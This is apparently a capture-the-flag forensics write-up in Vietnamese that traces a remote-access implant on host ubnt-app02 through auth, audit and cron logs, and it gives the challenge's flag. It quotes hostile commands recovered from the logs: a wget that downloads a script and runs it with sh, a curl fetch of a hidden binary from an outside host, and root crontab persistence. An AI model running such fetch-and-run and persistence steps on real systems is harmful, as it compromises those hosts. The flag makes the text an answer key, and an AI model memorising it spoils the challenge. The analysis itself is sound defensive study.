# notes.md - corporate-rat

Input: `files/corpo_rat.zip` (128747 B, sha256 `5109835422566de5a581fe8a8b58d9aa037d8639fa633fa2d486a45f7f6c5a66`)
Định dạng cờ đề yêu cầu: `cdctf{Firstname Lastname}`
Host trong log: `ubnt-app02`, cửa sổ `Sep 14` -> `Sep 27`.

## H1 - Attacker vào từ ngoài (brute-force / scanner)
cmd: `grep -c 'Accepted password' auth.log` rồi `grep 'Accepted password' auth.log | grep -vP 'from 10\.50\.' | wc -l`
evidence: 457 phiên Accepted, 0 phiên ngoài dải 10.50.x. 11 IP chỉ sinh dòng `Invalid user` / `Failed password` (198.51.100.23/.44/.71/.109/.180/.201, 203.0.113.12/.60/.91/.144/.200). 106 dòng UFW BLOCK đến từ 5 IP: 198.51.100.71 (34), 203.0.113.12 (24), 203.0.113.60 (23), 198.51.100.201 (15), 198.51.100.23 (10). 155 record `USER_LOGIN` trong audit.log đều `res=success`.
result: DEAD - không có vector bên ngoài nào lấy được phiên.

## H2 - gfoster (uid 1097) tải script từ 198.51.100.44
cmd: `grep -n 'a0="wget"' audit.log` + `grep -n 'gfoster' auth.log | tail`
evidence: `wget -q http://198.51.100.44/tools/monitoring-agent.sh -O /tmp/agent.sh` lúc Sep 25 15:07 (audit 101176-101179), rồi `sh /tmp/agent.sh`, rồi `rm /tmp/agent.sh`. gfoster có `sudo=yes`, phiên luôn từ 10.50.20.125 (workstation ổn định, 12 phiên).
        `grep -c 'CMD (/tmp/agent.sh' cron.log` = 0, `launched["/tmp/agent.sh"]` = 0, SOCKADDR cho host 198.51.100.44 = 0.
result: DEAD - một lần chạy, không persistence, không beacon. IP 198.51.100.44 cũng nằm trong danh sách scanner ở H1 nhưng không có bất kỳ chuỗi nào nối nó với implant.

## H3 - Backdoor account `newhire`
cmd: `grep -n 'newhire' auth.log`
evidence: 1 dòng `sudo: lroberts : ... COMMAND=/usr/sbin/useradd -m -s /bin/bash newhire` (Sep 25 12:23). Không dòng login nào, không auid nào chưa có trong roster.
result: DEAD - tài khoản tạo ra nhưng chưa dùng.

## H4 - Xóa log / anti-forensics
cmd: `grep -n 'log_cleanup' cron.log`
evidence: 7 dòng, chạy bởi ba user khác nhau (dross, lgreen, dmyers), lần đầu Sep 14 01:48 tức trước cả ngày implant xuất hiện; cron gốc của nó có mặt suốt cửa sổ log.
result: DEAD - noise đều, không gắn với chuỗi tải payload.

## H5 - `.upd` là updater hợp pháp của hệ thống
cmd: `grep -oP 'comm="\K[^"]+' audit.log | sort | uniq -c | sort -rn | head` + `grep 'a0="/tmp/.cache/.upd"' audit.log | head -2`
evidence: binary tên ẩn trong `/tmp/.cache`, PATH record `mode=0100755 ouid=0`, được tải bằng `curl` từ `http://203.0.113.77:8443/update`, không có gói `.deb`/dpkg nào nhắc tới nó trong syslog, và nó được đưa vào crontab của root qua `crontab -u root -e`.
result: DEAD - đây là implant, không phải updater.

## H6 - Chuỗi persistence -> auid -> tên (hướng đúng)
cmd: `grep -n 'crontab\[4711\]' cron.log` + `grep 'USER_CHAUTHTOK' audit.log` + `grep '\t1066\t' users.txt`
evidence:
  - cron.log `Sep 20 02:17:46 crontab[4711]: (root) REPLACE (root)`, `02:17:47 CRON RELOAD`, rồi 569 dòng `CMD (/tmp/.cache/.upd ...)`.
  - audit.log `USER_CHAUTHTOK pid=4711 uid=0 auid=1066 op=crontab-edit` - pid 4711 là cùng một tiến trình trên hai file.
  - users.txt `lhackson 1066 Lamar Hackson Finance no /bin/bash`.
  - Ba lệnh cài implant (curl/chmod/crontab) cùng `auid=1066 tty=pts4 ppid=4344`; sshd[4344] trong auth.log chính là phiên `Sep 20 02:14:14 Accepted password for lhackson from 10.50.44.233`.
  - `ppid` trong audit = pid của tiến trình sshd, đó là nối khóa giữa audit.log và auth.log khi `ses` không khớp (logind 50695 vs audit ses 5071).
result: OK - cờ `cdctf{Lamar Hackson}`.

## Chi tiết kỹ thuật đáng giữ

- `saddr` trong audit.log: 2 byte family LE + 2 byte port BE + 4 byte IPv4 BE.
  `02002157CB00714D` -> `203.0.113.77:8535`; `020020FBCB00714D` -> `203.0.113.77:8443`.
- Trong file này record EXECVE mang audit id ngay sau record SYSCALL của nó (curl: SYSCALL :101166,
  EXECVE :101167, SOCKADDR :101168), nên muốn lấy uid/auid của một lệnh thì tra `id - 1`.
- Chỉ một record có phần giây khác `.000` (`1789870512.050`), và đó đúng là kết nối tải payload: regex
  `\d+\.000` làm rơi mất nó, ban đầu khiến đếm 568 thay vì 569 SOCKADDR.
- Đối chiếu số học ba file: cron 569 lần chạy, syslog 570 ALLOW (1 SYN tải + 569 ACK), audit 569
  SOCKADDR (1 ở cổng 8443 + 568 beacon 8535). audit thiếu một beacon ở cuối cửa sổ log.
- Mâu thuẫn trong chính dữ liệu: `lhackson` có `sudo=no` trong roster và một lệnh bị
  `user NOT in sudoers`, nhưng ba lệnh sau vẫn chạy với `USER=root` mà không có dòng cấp quyền nào.
  Attribution đi theo `auid` trong audit record nên không phụ thuộc chi tiết này.
